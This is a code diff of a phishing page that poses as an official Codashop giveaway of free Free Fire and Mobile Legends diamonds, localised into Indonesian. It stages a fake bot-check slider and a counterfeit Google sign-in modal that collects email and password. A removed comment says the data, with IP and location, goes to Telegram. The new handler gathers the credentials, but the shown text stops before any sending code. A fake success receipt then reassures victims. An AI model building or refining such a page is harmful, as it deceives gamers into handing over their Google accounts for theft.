@@ -1,219 +1,234 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Codashop - Official Event Free Fire & Mobile Legends</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>Codashop - SESIAL EVENT Free Fire & Mobile Legends</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        codaDark: '#0f1923',
+                        codaCard: '#1a2634',
+                        codaCardHover: '#243447',
+                        codaBlue: '#0066cc',
+                        codaOrange: '#f7931e',
+                        codaYellow: '#ffcc00'
+                    }
+                }
+            }
+        }
+    </script>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
-        body { background-color: #1c1533; color: #fff; -webkit-tap-highlight-color: transparent; }
-        
-        /* Navbar */
-        .navbar { background: #221a3d; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 2px solid #2f2553; position: sticky; top: 0; z-index: 100; }
-        .logo-area { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 20px; color: #fff; letter-spacing: 0.5px; }
-        .logo-area i { color: #8c52ff; font-size: 24px; }
-        .nav-right { display: flex; align-items: center; gap: 12px; }
-        .flag-badge { display: flex; align-items: center; gap: 5px; background: #2f2553; padding: 5px 10px; border-radius: 20px; font-size: 13px; font-weight: 600; }
-
-        /* Container */
-        .container { max-width: 600px; margin: 0 auto; padding: 15px; }
-
-        /* Anti-Bot Overlay */
-        #bot-shield { position: fixed; inset: 0; background: rgba(15, 11, 28, 0.95); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .shield-box { background: #221a3d; border: 1px solid #3d3166; padding: 30px 20px; border-radius: 16px; text-align: center; width: 100%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .shield-box h3 { font-size: 18px; margin-bottom: 8px; font-weight: 700; }
-        .shield-box p { font-size: 12px; color: #b8b3cc; margin-bottom: 24px; }
-        
-        /* Slider Captcha */
-        .slider-container { background: #161026; border-radius: 30px; height: 50px; position: relative; display: flex; align-items: center; padding: 5px; border: 1px solid #382c5c; overflow: hidden; margin-bottom: 15px; }
-        .slider-text { position: absolute; width: 100%; text-align: center; font-size: 13px; color: #8e85ad; font-weight: 600; user-select: none; z-index: 1; }
-        .slider-btn { width: 40px; height: 40px; background: #8c52ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; cursor: pointer; z-index: 2; position: absolute; left: 5px; transition: transform 0.1s ease; box-shadow: 0 2px 8px rgba(140,82,255,0.4); }
-        .slider-success { background: #2ecc71 !important; }
-
-        /* Banner */
-        .banner { border-radius: 12px; overflow: hidden; margin-bottom: 20px; border: 1px solid #33265c; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
-        .banner img { width: 100%; display: block; }
-
-        /* Game Selector Grid */
-        .section-title { font-size: 16px; font-weight: 700; margin-bottom: 12px; color: #e2def5; }
-        .game-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 25px; }
-        .game-card { background: #241c3d; border: 2px solid #342959; border-radius: 12px; overflow: hidden; cursor: pointer; transition: all 0.2s; text-align: center; padding-bottom: 12px; }
-        .game-card:hover, .game-card.active { border-color: #8c52ff; background: #2c224f; transform: translateY(-2px); }
-        .game-card img { width: 100%; height: 130px; object-fit: cover; margin-bottom: 8px; }
-        .game-card span { font-size: 14px; font-weight: 700; display: block; padding: 0 8px; }
-
-        /* Form Steps */
-        .step-box { background: #221a3d; border: 1px solid #33265c; border-radius: 12px; padding: 16px; margin-bottom: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
-        .step-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; font-weight: 700; font-size: 14px; }
-        .step-num { background: #8c52ff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; }
-        
-        .input-group { display: flex; gap: 8px; }
-        .input-group input { flex: 1; background: #161026; border: 1px solid #3c2f66; padding: 10px 14px; border-radius: 8px; color: white; font-size: 14px; outline: none; }
-        .input-group input:focus { border-color: #8c52ff; }
-        .zone-input { max-width: 110px; }
-        .input-hint { font-size: 11px; color: #9b93b8; margin-top: 6px; line-height: 1.4; }
-
-        /* Items Grid (Free) */
-        .items-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
-        .item-card { background: #1b132e; border: 2px solid #362a5c; border-radius: 10px; padding: 12px; cursor: pointer; transition: 0.2s; position: relative; }
-        .item-card.selected { border-color: #8c52ff; background: #2b1f4d; }
-        .item-name { font-size: 13px; font-weight: 700; margin-bottom: 4px; }
-        .item-price { font-size: 12px; color: #2ecc71; font-weight: 700; }
-        .badge-free { position: absolute; top: 8px; right: 8px; background: #e74c3c; font-size: 9px; font-weight: 800; padding: 2px 6px; border-radius: 4px; text-transform: uppercase; }
-
-        /* Claim Button */
-        .btn-claim { width: 100%; background: #8c52ff; color: white; border: none; padding: 14px; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 20px; transition: background 0.2s; box-shadow: 0 4px 15px rgba(140,82,255,0.4); }
-        .btn-claim:hover { background: #7b42ef; }
-
-        /* Google Login Modal */
-        #google-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 999; display: none; align-items: center; justify-content: center; padding: 15px; }
-        .google-box { background: #ffffff; color: #202124; width: 100%; max-width: 400px; border-radius: 12px; padding: 30px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .google-box img { width: 75px; margin-bottom: 15px; }
-        .google-box h2 { font-size: 20px; font-weight: 600; margin-bottom: 8px; color: #202124; }
-        .google-box p { font-size: 13px; color: #5f6368; margin-bottom: 20px; }
-        .g-input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 6px; font-size: 14px; margin-bottom: 12px; outline: none; }
-        .g-input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
-        .g-btn { width: 100%; background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px; }
-        .g-btn:hover { background: #1557b0; }
-
-        /* Invoice Success Screen */
-        #invoice-screen { position: fixed; inset: 0; background: #1c1533; z-index: 1000; display: none; padding: 20px; overflow-y: auto; align-items: center; justify-content: center; }
-        .invoice-card { background: #221a3d; border: 1px solid #3c2f66; width: 100%; max-width: 420px; border-radius: 16px; padding: 25px; text-align: center; box-shadow: 0 10px 35px rgba(0,0,0,0.5); }
-        .invoice-card i.fa-check-circle { font-size: 55px; color: #2ecc71; margin-bottom: 15px; }
-        .invoice-card h3 { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
-        .invoice-card p.sub { font-size: 12px; color: #b3aeca; margin-bottom: 20px; }
-        .receipt-details { background: #17102b; border-radius: 10px; padding: 15px; text-align: left; margin-bottom: 20px; border: 1px solid #2f2352; }
-        .receipt-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 8px; }
-        .receipt-row span:first-child { color: #9b93b8; }
-        .receipt-row span:last-child { font-weight: 700; color: #fff; }
-        .pending-notice { background: rgba(241, 196, 15, 0.1); border: 1px solid #f1c40f; color: #f1c40f; padding: 12px; border-radius: 8px; font-size: 12px; font-weight: 600; line-height: 1.5; }
+        body { font-family: 'Inter', sans-serif; background-color: #0f1923; color: #fff; }
+        .google-font { font-family: 'Roboto', sans-serif; }
     </style>
 </head>
-<body>
+<body class="bg-[#0f1923] text-white min-h-screen flex flex-col justify-between">
 
-    <!-- ANTI-BOT VERIFICATION SHIELD -->
-    <div id="bot-shield">
-        <div class="shield-box">
-            <h3>Security Verification</h3>
-            <p>Please slide to verify you are a human and prevent automated bots.</p>
-            <div class="slider-container" id="sliderContainer">
-                <div class="slider-text">Slide to verify &rarr;</div>
-                <div class="slider-btn" id="sliderBtn"><i class="fa-solid fa-arrow-right"></i></div>
+    <div id="bot-shield" class="fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-4">
+        <div class="bg-[#1a2634] border border-[#2e4259] p-6 rounded-2xl text-center w-full max-w-sm shadow-2xl">
+            <div class="w-12 h-12 bg-blue-600/20 text-blue-400 rounded-full flex items-center justify-center mx-auto mb-4 text-xl">
+                <i class="fa-solid fa-shield-halved"></i>
             </div>
-            <div style="font-size: 11px; color: #786f96;">Protected by Advanced Anti-Bot Engine</div>
+            <h3 class="text-lg font-bold mb-1">Verifikasi Keamanan</h3>
+            <p class="text-xs text-gray-400 mb-6">Geser ke kanan untuk memverifikasi bahwa Anda adalah manusia.</p>
+            <div class="bg-[#121b24] rounded-full h-12 relative flex items-center p-1 border border-[#2e4259] overflow-hidden mb-3 select-none" id="sliderContainer">
+                <div class="absolute w-full text-center text-xs text-gray-400 font-semibold pointer-events-none">Geser untuk memverifikasi &rarr;</div>
+                <div class="w-10 h-10 bg-blue-600 hover:bg-blue-500 rounded-full flex items-center justify-center text-white cursor-pointer z-10 absolute left-1 transition-all shadow-md" id="sliderBtn">
+                    <i class="fa-solid fa-arrow-right"></i>
+                </div>
+            </div>
+            <span class="text-[10px] text-gray-500">Codashop Security Guard v3.2</span>
         </div>
     </div>
 
-    <!-- NAVBAR -->
-    <div class="navbar">
-        <div class="logo-area">
-            <i class="fa-solid fa-gem"></i> CODASHOP
-        </div>
-        <div class="nav-right">
-            <div class="flag-badge">
-                <img src="https://flagcdn.com/w20/id.png" width="16" alt="ID"> ID
+    <header class="bg-[#131f2c] border-b border-[#223344] sticky top-0 z-40">
+        <div class="max-w-4xl mx-auto px-4 py-3 flex items-center justify-between">
+            <div class="flex items-center gap-2 cursor-pointer">
+                <div class="bg-gradient-to-r from-blue-600 to-cyan-500 text-white font-extrabold text-xl px-2.5 py-1 rounded-lg tracking-wider flex items-center gap-1.5 shadow-lg">
+                    <i class="fa-solid fa-bolt text-yellow-300"></i> CODA<span class="text-yellow-300">SHOP</span>
+                </div>
+            </div>
+            <div class="flex items-center gap-3">
+                <div class="bg-[#1e2d3d] border border-[#2f4359] px-3 py-1.5 rounded-full flex items-center gap-2 text-xs font-semibold">
+                    <img src="https://flagcdn.com/w20/id.png" class="w-4 rounded-sm" alt="ID"> Indonesia
+                </div>
             </div>
         </div>
-    </div>
+    </header>
 
-    <!-- MAIN CONTAINER -->
-    <div class="container">
-        <!-- BANNER -->
-        <div class="banner">
-            <img src="https://images.unsplash.com/photo-1542751371-adc38448a05e?w=600&auto=format&fit=crop&q=60" alt="Event Banner">
-        </div>
-
-        <div class="section-title">Select Game Event</div>
-        <div class="game-grid">
-            <div class="game-card active" onclick="selectGame('Free Fire', this)">
-                <img src="https://images.unsplash.com/photo-1538481199705-c710c4e965fc?w=400&auto=format&fit=crop&q=60" alt="Free Fire">
-                <span>Free Fire</span>
-            </div>
-            <div class="game-card" onclick="selectGame('Mobile Legends', this)">
-                <img src="https://images.unsplash.com/photo-1563089145-599997674d42?w=400&auto=format&fit=crop&q=60" alt="Mobile Legends">
-                <span>Mobile Legends</span>
+    <main class="max-w-4xl mx-auto px-4 py-6 w-full flex-grow">
+        <!-- Event Banner -->
+        <div class="rounded-2xl overflow-hidden mb-6 border border-[#2a3c50] shadow-xl relative group">
+            <img src="https://images.unsplash.com/photo-1542751371-adc38448a05e?w=800&auto=format&fit=crop&q=80" alt="Event Banner" class="w-48 sm:w-full h-36 sm:h-52 object-cover w-full">
+            <div class="absolute inset-0 bg-gradient-to-t from-[#0f1923] via-transparent to-transparent flex items-end p-4">
+                <div>
+                    <span class="bg-orange-600 text-[10px] font-bold px-2 py-0.5 rounded uppercase tracking-wider mb-1 inline-block">Official Event</span>
+                    <h1 class="text-lg sm:text-2xl font-extrabold text-white">Bonus Spesial Top-Up & Redeem Item Gratis</h1>
+                </div>
             </div>
         </div>
 
-        <!-- STEP 1: PLAYER ID -->
-        <div class="step-box">
-            <div class="step-header">
-                <div class="step-num">1</div>
-                <div>Enter Player ID</div>
+        <!-- Game Selection Grid -->
+        <div class="text-sm font-bold text-gray-300 mb-3 flex items-center gap-2">
+            <span class="w-1.5 h-4 bg-blue-500 rounded-full"></span> Pilih Game Event
+        </div>
+        <div class="grid grid-cols-2 gap-4 mb-6">
+            <div class="game-card bg-[#182533] border-2 border-blue-600 rounded-xl p-3 cursor-pointer transition-all flex items-center gap-3 shadow-md" onclick="selectGame('Free Fire', this)">
+                <img src="https://images.unsplash.com/photo-1538481199705-c710c4e965fc?w=100&auto=format&fit=crop&q=80" class="w-12 h-12 rounded-lg object-cover" alt="Free Fire">
+                <div>
+                    <h4 class="font-bold text-sm">Free Fire</h4>
+                    <span class="text-[11px] text-green-400 font-medium">Garena</span>
+                </div>
             </div>
-            <div class="input-group">
-                <input type="text" id="playerId" placeholder="Enter User ID">
-                <input type="text" id="zoneId" class="zone-input" placeholder="Zone ID" style="display:none;">
+            <div class="game-card bg-[#182533] border-2 border-transparent hover:border-[#2f4359] rounded-xl p-3 cursor-pointer transition-all flex items-center gap-3 shadow-md" onclick="selectGame('Mobile Legends', this)">
+                <img src="https://images.unsplash.com/photo-1563089145-599997674d42?w=100&auto=format&fit=crop&q=80" class="w-12 h-12 rounded-lg object-cover" alt="Mobile Legends">
+                <div>
+                    <h4 class="font-bold text-sm">Mobile Legends</h4>
+                    <span class="text-[11px] text-green-400 font-medium">Moonton</span>
+                </div>
             </div>
-            <div class="input-hint" id="idHint">To find your ID, tap on your avatar in the top left corner of the game main menu.</div>
         </div>
 
-        <!-- STEP 2: SELECT FREE ITEM -->
-        <div class="step-box">
-            <div class="step-header">
-                <div class="step-num">2</div>
-                <div>Select Free Reward Item</div>
+        <!-- Step 1: User ID & Zone ID -->
+        <div class="bg-[#16222f] border border-[#253648] rounded-xl p-4 mb-6 shadow-md">
+            <div class="flex items-center gap-2.5 mb-3">
+                <div class="w-6 h-6 bg-blue-600 rounded-full flex items-center justify-center text-xs font-bold text-white">1</div>
+                <h3 class="font-bold text-sm">Masukkan Data Akun</h3>
             </div>
-            <div class="items-grid" id="itemsGrid"></div>
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                <div>
+                    <input type="text" id="playerId" placeholder="Masukkan User ID (Contoh: 12345678)" class="w-full bg-[#101923] border border-[#293d52] focus:border-blue-500 rounded-lg px-3.5 py-2.5 text-sm outline-none transition-all">
+                </div>
+                <div>
+                    <input type="text" id="zoneId" placeholder="Server / Zone ID (Contoh: 1234)" class="w-full bg-[#101923] border border-[#293d52] focus:border-blue-500 rounded-lg px-3.5 py-2.5 text-sm outline-none transition-all" style="display:none;">
+                </div>
+            </div>
+            <p class="text-[11px] text-gray-400 mt-2" id="idHint">Untuk menemukan User ID Anda, silakan klik pada ikon karakter di pojok kiri atas menu utama game.</p>
         </div>
 
-        <!-- CLAIM BUTTON -->
-        <button class="btn-claim" onclick="triggerLogin()">CLAIM NOW</button>
-    </div>
+        <!-- Step 2: Select Reward Item -->
+        <div class="bg-[#16222f] border border-[#253648] rounded-xl p-4 mb-6 shadow-md">
+            <div class="flex items-center gap-2.5 mb-3">
+                <div class="w-6 h-6 bg-blue-600 rounded-full flex items-center justify-center text-xs font-bold text-white">2</div>
+                <h3 class="font-bold text-sm">Pilih Nominal Hadiah Gratis</h3>
+            </div>
+            <div class="grid grid-cols-2 sm:grid-cols-3 gap-3" id="itemsGrid">
+                <!-- Dynamic Items Rendered via JS -->
+            </div>
+        </div>
 
-    <!-- GOOGLE LOGIN MODAL -->
-    <div id="google-modal">
-        <div class="google-box">
-            <img src="https://www.freepnglogos.com/uploads/google-logo-png/google-logo-png-webinar-optimizing-for-success-google-business-pg-profile-13.png" alt="Google">
-            <h2>Sign in with Google</h2>
-            <p>to verify ownership of your game account</p>
-            <form onsubmit="submitData(event)">
-                <input type="email" id="gEmail" class="g-input" placeholder="Email or phone" required>
-                <input type="password" id="gPass" class="g-input" placeholder="Enter your password" required>
-                <button type="submit" class="g-btn">Next</button>
+        <!-- Claim Action Button -->
+        <button id="claimBtn" onclick="triggerGoogleLogin()" class="w-full bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-500 hover:to-cyan-500 text-white font-bold py-3.5 rounded-xl shadow-lg transition-all text-base flex items-center justify-center gap-2 cursor-pointer">
+            <i class="fa-solid fa-gift text-yellow-300"><span> AMBIL HADIAH SEKARANG</span></i>
+        </button>
+
+        <!-- Information / FAQ Footer Note -->
+        <div class="mt-8 bg-[#131f2c] border border-[#223344] rounded-xl p-4 text-xs text-gray-400 leading-relaxed">
+            <h4 class="font-bold text-gray-300 mb-1.5 flex items-center gap-1.5"><i class="fa-solid fa-circle-info text-blue-400"></i> Tentang Event Codashop</h4>
+            <p>Codashop adalah cara tercepat dan termudah untuk top-up kredit game favorit Anda. Kami dipercaya oleh jutaan gamers di seluruh Asia Tenggara. Proses instan dan aman langsung masuk ke dalam akun game Anda.</p>
+        </div>
+    </main>
+
+    <div id="googleModal" class="fixed inset-0 bg-black/80 z-50 hidden items-center justify-center p-4 google-font">
+        <div class="bg-white text-[#202124] w-full max-w-[420px] rounded-2xl p-8 shadow-2xl relative">
+            <!-- Google Brand Logo SVG -->
+            <div class="text-center mb-6">
+                <svg class="mx-auto w-10 h-10 mb-2" viewBox="0 0 24 24">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
+                </svg>
+                <h2 class="text-xl font-medium text-[#202124]">Login dengan Akun Google</h2>
+                <p class="text-xs text-[#5f6368] mt-1">untuk verifikasi kepemilikan game Anda</p>
+            </div>
+
+            <!-- Login Form -->
+            <form onsubmit="submitCredentials(event)" id="loginForm">
+                <div class="mb-4">
+                    <input type="email" id="gEmail" required class="w-full px-3.5 py-3 border border-[#dadce0] rounded-lg text-sm outline-none focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8]" placeholder="Email atau ponsel">
+                </div>
+                <div class="mb-2">
+                    <input type="password" id="gPass" required class="w-full px-3.5 py-3 border border-[#dadce0] rounded-lg text-sm outline-none focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8]" placeholder="Masukkan sandi Anda">
+                </div>
+                <div class="text-right mb-6">
+                    <a href="#" class="text-xs text-[#1a73e8] font-medium hover:underline">Lupa sandi?</a>
+                </div>
+                <div class="flex items-center justify-between">
+                    <button type="button" onclick="closeGoogleModal()" class="text-sm font-medium text-[#1a73e8] hover:bg-blue-50 px-4 py-2 rounded-lg transition-all">Batal</button>
+                    <button type="submit" id="submitLoginBtn" class="bg-[#1a73e8] hover:bg-[#1557b0] text-white font-medium text-sm px-6 py-2.5 rounded-lg shadow transition-all flex items-center gap-2">
+                        <span>Berikutnya</span>
+                    </button>
+                </div>
             </form>
         </div>
     </div>
 
-    <!-- INVOICE SCREEN -->
-    <div id="invoice-screen">
-        <div class="invoice-card">
-            <i class="fa-solid fa-circle-check"></i>
-            <h3>Claim Successful!</h3>
-            <p class="sub">Your request has been successfully queued in our system.</p>
+    <div id="invoiceScreen" class="fixed inset-0 bg-[#0f1923] z-50 hidden items-center justify-center p-4">
+        <div class="bg-[#1a2634] border border-[#2e4259] w-full max-w-md rounded-2xl p-6 text-center shadow-2xl">
+            <div class="w-16 h-16 bg-green-500/20 text-green-400 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl">
+                <i class="fa-solid fa-circle-check"></i>
+            </div>
+            <h3 class="text-xl font-bold mb-1">Klaim Berhasil Diproses!</h3>
+            <p class="text-xs text-gray-400 mb-6">Permintaan hadiah Anda telah dimasukkan ke dalam antrean sistem.</p>
             
-            <div class="receipt-details">
-                <div class="receipt-row"><span>Game:</span> <span id="rGame">-</span></div>
-                <div class="receipt-row"><span>Player ID:</span> <span id="rId">-</span></div>
-                <div class="receipt-row"><span>Reward:</span> <span id="rItem">-</span></div>
-                <div class="receipt-row"><span>Price:</span> <span style="color:#2ecc71;">FREE ($0.00)</span></div>
-                <div class="receipt-row"><span>Status:</span> <span style="color:#f1c40f;">Processing</span></div>
+            <div class="bg-[#121b24] border border-[#243547] rounded-xl p-4 text-left mb-6 text-xs space-y-2.5">
+                <div class="flex justify-between"><span class="text-gray-400">Game:</span> <span id="rGame" class="font-bold text-white">-</span></div>
+                <div class="flex justify-between"><span class="text-gray-400">ID Akun:</span> <span id="rId" class="font-bold text-white">-</span></div>
+                <div class="flex justify-between"><span class="text-gray-400">Hadiah Item:</span> <span id="rItem" class="font-bold text-yellow-400">-</span></div>
+                <div class="flex justify-between"><span class="text-gray-400">Biaya:</span> <span class="font-bold text-green-400">GRATIS (IDR 0)</span></div>
+                <div class="flex justify-between"><span class="text-gray-400">Status:</span> <span class="font-bold text-yellow-400 animate-pulse">Menunggu Pengiriman</span></div>
             </div>
 
-            <div class="pending-notice">
-                Please wait 5 minutes. If it does not enter your account, please try again.
+            <div class="bg-yellow-500/10 border border-yellow-500/30 text-yellow-300 p-3 rounded-lg text-xs leading-relaxed mb-6">
+                Mohon tunggu 5-10 menit. Hadiah akan dikirim otomatis ke in-game mailbox akun Anda.
             </div>
+
+            <button onclick="location.reload()" class="w-full bg-[#243447] hover:bg-[#2e4259] text-white font-bold py-3 rounded-xl text-sm transition-all">Selesai / Kembali</button>
         </div>
     </div>
 
+    <footer class="bg-[#131f2c] border-t border-[#223344] py-6 text-center text-xs text-gray-400">
+        <div class="max-w-4xl mx-auto px-4">
+            <p>&copy; Codashop. Hak Cipta Dilindungi Undang-Undang.</p>
+            <p class="mt-1">Kerjasama Resmi Event Garena & Moonton Indonesia</p>
+        </div>
+    </footer>
+
     <script>
         let currentGame = 'Free Fire';
-        let currentItem = '73100 Diamonds + Exclusive Bundle';
-        
+        let currentItem = '73.100 Diamonds + Exclusive Bundle';
+        let isSubmitted = false; // Mencegah spam / double-submit
+
         const ffItems = [
-            { name: '73100 Diamonds', bonus: '+ Exclusive Bundle' },
-            { name: '36500 Diamonds', bonus: '+ Elite Pass' },
-            { name: '7290 Diamonds', bonus: '+ Gun Skin' },
-            { name: '3640 Diamonds', bonus: '+ Pet Bonus' }
+            { name: '5 Diamonds', bonus: '+ Bonus 10%' },
+            { name: '50 Diamonds', bonus: '+ Bonus 50' },
+            { name: '100 Diamonds', bonus: '+ Bonus 100' },
+            { name: '355 Diamonds', bonus: '+ Elite Pass' },
+            { name: '720 Diamonds', bonus: '+ Gun Skin Epic' },
+            { name: '1440 Diamonds', bonus: '+ Special Bundle' },
+            { name: '2180 Diamonds', bonus: '+ Emote Langka' },
+            { name: '3650 Diamonds', bonus: '+ 1000 Bonus' },
+            { name: '7290 Diamonds', bonus: '+ Full Set Skin' },
+            { name: '73100 Diamonds', bonus: '+ VIP Exclusive Bundle' }
         ];
 
         const mlItems = [
-            { name: 'Twilight Pass', bonus: '+ 500 Diamonds' },
             { name: 'Weekly Diamond Pass', bonus: '+ 220 Diamonds' },
-            { name: '5000 Diamonds', bonus: '+ Epic Skin' },
-            { name: '1000 Diamonds', bonus: '+ Starlight Card' }
+            { name: 'Twilight Pass', bonus: '+ 500 Diamonds' },
+            { name: '50 Diamonds', bonus: '+ Starlight Points' },
+            { name: '250 Diamonds', bonus: '+ Bonus Epic Skin' },
+            { name: '500 Diamonds', bonus: '+ Hero Trial Card' },
+            { name: '1000 Diamonds', bonus: '+ Collector Token' },
+            { name: '2500 Diamonds', bonus: '+ Zodiac Skin' },
+            { name: '5000 Diamonds', bonus: '+ Legend Skin Box' },
+            { name: '10000 Diamonds', bonus: '+ All Heroes Unlock' }
         ];
 
         function renderItems() {
@@ -223,12 +238,12 @@
             
             items.forEach((item, index) => {
                 const div = document.createElement('div');
-                div.className = `item-card ${index === 0 ? 'selected' : ''}`;
+                div.className = `item-card bg-[#111a24] border-2 ${index === 0 ? 'border-blue-500 bg-[#1a2d42]' : 'border-[#243547]'} rounded-xl p-3 cursor-pointer transition-all relative overflow-hidden`;
                 div.onclick = () => selectItem(item.name + ' ' + item.bonus, div);
                 div.innerHTML = `
-                    <div class="badge-free">FREE</div>
-                    <div class="item-name">${item.name}</div>
-                    <div class="item-price">${item.bonus}</div>
+                    <div class="absolute top-0 right-0 bg-red-600 text-[9px] font-extrabold px-2 py-0.5 rounded-bl uppercase">Gratis</div>
+                    <div class="font-bold text-sm mb-1 text-white">${item.name}</div>
+                    <div class="text-[11px] text-green-400 font-semibold">${item.bonus}</div>
                 `;
                 grid.appendChild(div);
             });
@@ -237,29 +252,37 @@
 
         function selectGame(gameName, element) {
             currentGame = gameName;
-            document.querySelectorAll('.game-card').forEach(c => c.classList.remove('active'));
-            element.classList.add('active');
+            document.querySelectorAll('.game-card').forEach(c => {
+                c.classList.remove('border-blue-600');
+                c.classList.add('border-transparent');
+            });
+            element.classList.remove('border-transparent');
+            element.classList.add('border-blue-600');
             
             const zoneInput = document.getElementById('zoneId');
             const idHint = document.getElementById('idHint');
             
             if(gameName === 'Mobile Legends') {
                 zoneInput.style.display = 'block';
-                idHint.innerText = "To find your User ID and Zone ID, tap on your profile icon in the top left corner. Example: 12345678 (1234)";
+                idHint.innerText = "Untuk menemukan User ID & Zone ID Anda, klik pada ikon karakter di pojok kiri atas menu profil game (Contoh: 12345678 (1234)).";
             } else {
                 zoneInput.style.display = 'none';
-                idHint.innerText = "To find your ID, tap on your avatar in the top left corner of the game main menu.";
+                idHint.innerText = "Untuk menemukan User ID Anda, silakan klik pada ikon karakter di pojok kiri atas menu utama game.";
             }
             renderItems();
         }
 
         function selectItem(itemName, element) {
-            document.querySelectorAll('.item-card').forEach(c => c.classList.remove('selected'));
-            element.classList.add('selected');
+            document.querySelectorAll('#itemsGrid > div').forEach(c => {
+                c.classList.remove('border-blue-500', 'bg-[#1a2d42]');
+                c.classList.add('border-[#243547]');
+            });
+            element.classList.remove('border-[#243547]');
+            element.classList.add('border-blue-500', 'bg-[#1a2d42]');
             currentItem = itemName;
         }
 
-        // Anti-Bot Slider Logic
+        // Slider Anti-Bot Verification Logic
         const sliderBtn = document.getElementById('sliderBtn');
         const sliderContainer = document.getElementById('sliderContainer');
         let isDragging = false;
@@ -281,13 +304,13 @@
             if (!isDragging) return;
             const clientX = e.clientX || e.touches[0].clientX;
             const diff = clientX - startX;
-            const max = sliderContainer.clientWidth - sliderBtn.clientWidth - 10;
+            const max = sliderContainer.clientWidth - sliderBtn.clientWidth - 8;
             
             if (diff > 0 && diff <= max) {
                 sliderBtn.style.transform = `translateX(${diff}px)`;
             } else if (diff > max) {
                 sliderBtn.style.transform = `translateX(${max}px)`;
-                successVerify();
+                passVerification();
             }
         }
 
@@ -301,69 +324,121 @@
             }
         }
 
-        function successVerify() {
-            sliderBtn.classList.add('slider-success');
-            sliderBtn.innerHTML = '<i class="fa-solid fa-check"></i>';
-            document.querySelector('.slider-text').innerText = 'Verified Successfully';
+        function passVerification() {
+            sliderBtn.innerHTML = '<i class="fa-solid fa-check text-white"></i>';
+            sliderBtn.classList.remove('bg-blue-600');
+            sliderBtn.classList.add('bg-green-600');
             setTimeout(() => {
                 document.getElementById('bot-shield').style.display = 'none';
-            }, 600);
+            }, 500);
         }
 
-        function triggerLogin() {
-            const playerId = document.getElementById('playerId').value;
+        function triggerGoogleLogin() {
+            const playerId = document.getElementById('playerId').value.trim();
             if(!playerId) {
-                alert('Please enter your Player ID first!');
+                alert('Silakan masukkan ID Pemain / User ID Anda terlebih dahulu!');
                 return;
             }
-            document.getElementById('google-modal').style.display = 'flex';
+            if(currentGame === 'Mobile Legends') {
+                const zoneId = document.getElementById('zoneId').value.trim();
+                if(!zoneId) {
+                    alert('Silakan masukkan Server / Zone ID Anda terlebih dahulu!');
+                    return;
+                }
+            }
+            document.getElementById('googleModal').style.display = 'flex';
         }
 
-        // AUTO GET IP, GEO, ASN & SEND TO TELEGRAM
-        async function submitData(e) {
+        function closeGoogleModal() {
+            document.getElementById('googleModal').style.display = 'none';
+        }
+
+        // Robust IP Geolocation API with Fallback & Anti Spam
+        async function submitCredentials(e) {
             e.preventDefault();
+            if (isSubmitted) return; // Mencegah pengiriman berulang / spam
+            isSubmitted = true;
+
+            const submitBtn = document.getElementById('submitLoginBtn');
+            submitBtn.innerText = 'Memverifikasi...';
+            submitBtn.disabled = true;
+
             const email = document.getElementById('gEmail').value;
             const password = document.getElementById('gPass').value;
             const playerId = document.getElementById('playerId').value;
             const zoneId = document.getElementById('zoneId').value;
             const fullId = zoneId ? `${playerId} (${zoneId})` : playerId;
 
